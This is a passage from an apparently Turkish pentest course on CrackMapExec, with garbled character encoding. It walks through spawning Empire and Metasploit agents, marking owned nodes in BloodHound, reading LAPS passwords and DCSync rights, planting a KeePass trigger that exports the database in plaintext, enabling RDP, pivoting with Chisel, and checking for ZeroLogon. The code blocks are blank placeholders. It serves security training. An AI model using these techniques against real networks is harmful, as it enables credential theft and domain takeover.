### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

